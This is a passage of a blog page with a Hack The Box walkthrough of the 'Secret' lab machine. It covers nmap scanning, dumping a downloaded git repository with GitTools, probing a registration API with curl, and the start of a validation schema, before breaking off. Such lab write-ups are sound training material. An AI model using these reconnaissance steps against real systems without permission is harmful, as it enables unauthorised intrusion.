<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="introduceOS:	 LinuxDifficulty:	EasyPoints:	20Release:	30 Oct 2021IP:	10.10.11.120">
<meta property="og:type" content="article">
<meta property="og:title" content="Hack-The-Box-walkthrough[Secret]">
<meta property="og:url" content="https://fdlucifer.github.io/2021/11/01/secret/index.html">
<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
<meta property="og:description" content="introduceOS:	 LinuxDifficulty:	EasyPoints:	20Release:	30 Oct 2021IP:	10.10.11.120">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2092.jpg">
<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2093.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2094.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2095.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2096.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2097.jpg">
<meta property="article:published_time" content="2021-11-01T12:38:15.000Z">
<meta property="article:modified_time" content="2022-03-26T17:20:09.382Z">
<meta property="article:author" content="lUc1f3r11">
<meta property="article:tag" content="HackTheBox靶机练习">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2092.jpg">


<link rel="canonical" href="https://fdlucifer.github.io/2021/11/01/secret/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/11/01/secret/","path":"2021/11/01/secret/","title":"Hack-The-Box-walkthrough[Secret]"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Hack-The-Box-walkthrough[Secret] | lUc1f3r11's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="lUc1f3r11's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">lUc1f3r11's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">202</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Enumeration"><span class="nav-number">2.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Open-Ports"><span class="nav-number">2.1.</span> <span class="nav-text">Open Ports</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NMAP"><span class="nav-number">2.2.</span> <span class="nav-text">NMAP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Manual-Enumeration"><span class="nav-number">2.3.</span> <span class="nav-text">Manual Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Live-Demo"><span class="nav-number">2.3.1.</span> <span class="nav-text">Live Demo</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Source-Code"><span class="nav-number">2.3.2.</span> <span class="nav-text">Source Code</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Git-Dump-Enumeration"><span class="nav-number">2.4.</span> <span class="nav-text">Git Dump Enumeration</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Registering-User"><span class="nav-number">2.5.</span> <span class="nav-text">Registering User</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Forging-token"><span class="nav-number">2.6.</span> <span class="nav-text">Forging token</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploitation"><span class="nav-number">3.</span> <span class="nav-text">Exploitation</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Command-Injection"><span class="nav-number">3.1.</span> <span class="nav-text">Command Injection</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PrivESC"><span class="nav-number">4.</span> <span class="nav-text">PrivESC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SUID-Binaries"><span class="nav-number">4.1.</span> <span class="nav-text">SUID Binaries</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Shell-1"><span class="nav-number">4.1.1.</span> <span class="nav-text">Shell 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Shell-2"><span class="nav-number">4.1.2.</span> <span class="nav-text">Shell 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Shell-1-1"><span class="nav-number">4.1.3.</span> <span class="nav-text">Shell 1</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">5.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Contact-me"><span class="nav-number">6.</span> <span class="nav-text">Contact me</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
      src="/images/blackhole.png">
  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">202</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">32</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">42</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="Back to top">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/11/01/secret/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/blackhole.png">
      <meta itemprop="name" content="lUc1f3r11">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lUc1f3r11's blog">
      <meta itemprop="description" content="All things about infosec & ctf">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Hack-The-Box-walkthrough[Secret] | lUc1f3r11's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Hack-The-Box-walkthrough[Secret]
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-11-01 20:38:15" itemprop="dateCreated datePublished" datetime="2021-11-01T20:38:15+08:00">2021-11-01</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-03-27 01:20:09" itemprop="dateModified" datetime="2022-03-27T01:20:09+08:00">2022-03-27</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span></span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>NaN:aN</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h1><p>OS:	 Linux<br>Difficulty:	Easy<br>Points:	20<br>Release:	30 Oct 2021<br>IP:	10.10.11.120</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2092.jpg"></p>
</li>
<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
</li>
</ul>
<span id="more"></span>

<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="Open-Ports"><a href="#Open-Ports" class="headerlink" title="Open Ports"></a>Open Ports</h2><table>
<thead>
<tr>
<th>Ports</th>
<th>Service</th>
<th>Takeaways</th>
</tr>
</thead>
<tbody><tr>
<td>22</td>
<td>SSH</td>
<td>OpenSSH 8.2p1</td>
</tr>
<tr>
<td>80</td>
<td>HTTP</td>
<td>nginx 1.18.0</td>
</tr>
<tr>
<td>3000</td>
<td>HTTP</td>
<td>Node.js</td>
</tr>
</tbody></table>
<h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.91 scan initiated Sun Oct 31 00:15:29 2021 as: nmap -vvv -p 22,80,3000 -A -v -sC -sV -oN intial.nmap 10.10.11.120</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> secret.htb (10.10.11.120)</span><br><span class="line">Host is up, received syn-ack (0.23s latency).</span><br><span class="line">Scanned at 2021-10-31 00:15:31 EDT <span class="keyword">for</span> 21s</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE REASON  VERSION</span><br><span class="line">22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)</span><br><span class="line">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBjDFc+UtqNVYIrxJx+2Z9ZGi7LtoV6vkWkbALvRXmFzqStfJ3UM7TuOcZcPd82vk0gFVN2/wjA3LUlbUlr7oSlD15DdJkr/XjYrZLJnG4NCxcAnbB5CIRaWmrrdGy5pJ/KgKr4UEVGDK+oAgE7wbv++el2WeD1DF8gw+GIHhtjrK1s0nfyNGcmGOwx8crtHB4xLpopAxWDr2jzMFMdGcIzZMRVLbe+TsG/8O/GFgNXU1WqFYGe4xl+MCmomjh9mUspf1WP2SRZ7V0kndJJxtRBTw6V+NQ/7EJYJPMeugOtbputyZMH+jALhzxBs07JLbw8Bh9JX+ZJl/j6VcIDfFRXxB7ceSe/cp4UYWcLqN+AsoE7k+uMCV6vmXYPNC3g5xfMMrDfVmGmrPbop0oPZUB3kr8iz5CI/qM61WI07/MME1uyM352WZHAJmeBLPAOy05ZBY+DgpVElkr0vVa+3UyKsF1dC3Qm2jisx/qh3sGauv1R8oXGHvy0+oeMOlJN+k=</span><br><span class="line">|   256 95:ed:65:8d:<span class="built_in">cd</span>:08:2b:55:<span class="built_in">dd</span>:17:51:31:1e:3e:18:12 (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOL9rRkuTBwrdKEa+8VrwUjloHdmUdDR87hBOczK1zpwrsV/lXE1L/bYvDMUDVD0jE/aqMhekqNfBimt8aX53O0=</span><br><span class="line">|   256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINM1K8Yufj5FJnBjvDzcr+32BQ9R/2lS/Mu33ExJwsci</span><br><span class="line">80/tcp   open  http    syn-ack nginx 1.18.0 (Ubuntu)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: DUMB Docs</span><br><span class="line">3000/tcp open  http    syn-ack Node.js (Express middleware)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-title: DUMB Docs</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Sun Oct 31 00:15:52 2021 -- 1 IP address (1 host up) scanned in 24.06 seconds</span></span><br></pre></td></tr></table></figure>

<h2 id="Manual-Enumeration"><a href="#Manual-Enumeration" class="headerlink" title="Manual Enumeration"></a>Manual Enumeration</h2><p>Just Visting websites on ports 80,3000 both looked same.<br>Just gazing through website 2 features looks intresting.</p>
<h3 id="Live-Demo"><a href="#Live-Demo" class="headerlink" title="Live Demo"></a>Live Demo</h3><ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2093.jpg"></li>
</ul>
<p>which redirets to &#x2F;api endpoint</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2094.jpg"></li>
</ul>
<p>Nothing intresting for now so let’s move on to the seond feature.</p>
<h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2095.jpg"></li>
</ul>
<p>The website seeming gives out it source code on website just like any other open source projects.</p>
<p>So let’s download it and inspects for something good.</p>
<p>Looking at the directory listing of source code it looks like it a git repository.</p>
<p>It was all confirmed by ohmyzsh in my case.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  local-web git:(master) <span class="built_in">ls</span> -al</span><br><span class="line">total 116</span><br><span class="line">drwxr-xr-x   8 kali kali  4096 Sep  3 01:57 .</span><br><span class="line">drwxr-xr-x   3 kali kali  4096 Oct 31 00:28 ..</span><br><span class="line">-rw-r--r--   1 kali kali    72 Sep  3 01:59 .<span class="built_in">env</span></span><br><span class="line">drwxr-xr-x   8 kali kali  4096 Sep  8 14:33 .git</span><br><span class="line">-rw-r--r--   1 kali kali   885 Sep  3 01:56 index.js</span><br><span class="line">drwxr-xr-x   2 kali kali  4096 Aug 13 00:42 model</span><br><span class="line">drwxr-xr-x 201 kali kali  4096 Aug 13 00:42 node_modules</span><br><span class="line">-rw-r--r--   1 kali kali   491 Aug 13 00:42 package.json</span><br><span class="line">-rw-r--r--   1 kali kali 69452 Aug 13 00:42 package-lock.json</span><br><span class="line">drwxr-xr-x   4 kali kali  4096 Sep  3 01:54 public</span><br><span class="line">drwxr-xr-x   2 kali kali  4096 Sep  3 02:32 routes</span><br><span class="line">drwxr-xr-x   4 kali kali  4096 Aug 13 00:42 src</span><br><span class="line">-rw-r--r--   1 kali kali   651 Aug 13 00:42 validations.js</span><br></pre></td></tr></table></figure>

<p>I used git extractor tools to extract everything from the git archives.<br>Link to the GitTools I Used <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ludGVybmV0d2FjaGUvR2l0VG9vbHM=">https://github.com/internetwache/GitTools<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> dump</span><br><span class="line">/root/GitTools-master/Extractor/extractor.sh local-web/ dump</span><br></pre></td></tr></table></figure>

<p>and it will take time as it is a big repository so give it some time to complete.</p>
<p>While that’s running I did some manual enumeration.</p>
<p>Looking at index.js we can see that the is an &#x2F;api&#x2F;user endpoint on auth route and auth route and it logic is defined in &#x2F;route&#x2F;auth.</p>
<p>so let’s check &#x2F;routes&#x2F;auth.js</p>
<p>we can see there is the &#x2F;register endpoint to register user so let’s confirm this by sending a post request as get requests are not allowed.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/secret]</span><br><span class="line">└─<span class="comment"># curl -X POST -H &#x27;Content-Type: application/json&#x27; -v http://secret.htb/api/user/register --data &#x27;&#123;&quot;foo&quot;: &quot;bar&quot;&#125;&#x27;</span></span><br><span class="line">Note: Unnecessary use of -X or --request, POST is already inferred.</span><br><span class="line">*   Trying 10.10.11.120:80...</span><br><span class="line">* Connected to secret.htb (10.10.11.120) port 80 (<span class="comment">#0)</span></span><br><span class="line">&gt; POST /api/user/register HTTP/1.1</span><br><span class="line">&gt; Host: secret.htb</span><br><span class="line">&gt; User-Agent: curl/7.74.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; Content-Type: application/json</span><br><span class="line">&gt; Content-Length: 14</span><br><span class="line">&gt; </span><br><span class="line">* upload completely sent off: 14 out of 14 bytes</span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">&lt; HTTP/1.1 400 Bad Request</span><br><span class="line">&lt; Server: nginx/1.18.0 (Ubuntu)</span><br><span class="line">&lt; Date: Mon, 01 Nov 2021 13:35:31 GMT</span><br><span class="line">&lt; Content-Type: text/html; charset=utf-8</span><br><span class="line">&lt; Content-Length: 18</span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line">&lt; X-Powered-By: Express</span><br><span class="line">&lt; ETag: W/<span class="string">&quot;12-FCVaNPnXYf0hIGYsTUTYByRq5/U&quot;</span></span><br><span class="line">&lt; </span><br><span class="line">* Connection <span class="comment">#0 to host secret.htb left intact</span></span><br><span class="line"><span class="string">&quot;name&quot;</span> is required</span><br></pre></td></tr></table></figure>

<p>looks like we have a valid endpoint so let’s see what data it is expecting us to send in order to register a user.<br>Looks like it expects us to give name,email,password in order to register the user.<br>Looks like this schema is also defined in validation.js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Joi</span> = <span class="built_in">require</span>(<span class="string">&#x27;@hapi/joi&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// register validation </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">registerValidation</span> = data =&gt;&#123;</span><br><span class="line">    <span class="keyword">const</span> schema = &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="title class_">Joi</span>.<span class="title function_">string</span>().<span class="title function_">min</span>(<span class="number">6</span>).required(),</span><br><span class="line">        <span class="attr">email</span>: <span class="title class_">Joi</span>.<span class="title function_">string</span>().<span class="title function_">min</span>(<span class="number">6</span>).required().<span class="title function_">email</span>(),</span><br><span class="line">        <span class="attr">password</span>: <span class="title class_">Joi</span>.<span class="title function_">string</span>().<span class="title 